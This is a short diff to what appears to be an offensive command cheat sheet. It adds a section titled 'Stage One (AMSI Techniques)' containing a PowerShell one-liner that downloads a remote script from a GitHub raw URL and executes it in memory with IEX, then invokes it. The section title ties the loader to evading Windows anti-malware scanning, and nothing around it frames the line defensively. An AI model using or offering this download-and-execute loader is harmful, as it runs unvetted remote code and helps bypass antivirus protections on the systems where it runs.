@@ -9,4 +9,8 @@ awk  '{print "http://" $1}' urls.txt
 ~~~
 sudo chmod +x $(find /PATH/)
 ~~~
+## Stage One (AMSI Techniques)
+~~~
+IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/HeeresS/Small-Code/main/StageOne.ps1'); Invoke-StageOne
+~~~
 
